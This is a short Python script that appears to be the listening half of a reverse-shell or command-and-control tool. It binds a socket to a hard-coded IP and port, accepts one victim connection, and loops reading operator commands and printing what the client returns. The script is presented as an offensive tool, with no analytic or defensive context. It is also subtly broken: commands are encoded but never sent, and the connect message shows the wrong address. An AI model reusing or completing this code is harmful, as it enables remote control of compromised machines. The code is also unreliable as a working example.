#from colorama import Fore, Style

import os
import socket


host = '2.235.240.156'
port = 8888

server = socket.socket()
server.bind((host,port))
print('[{!}] SERVER CREATE')
print('[{>}] WAITING FOR CLIENT CONNECTION')

server.listen(1)
client, client_addr = server.accept()
print('[{+}] SERVER CONNCET TO '+host)

while True:
    command = input('$/'+host+'/>')
    command = command.encode()

    output = client.recv(1024)
    output = output.decode()
    print(output)
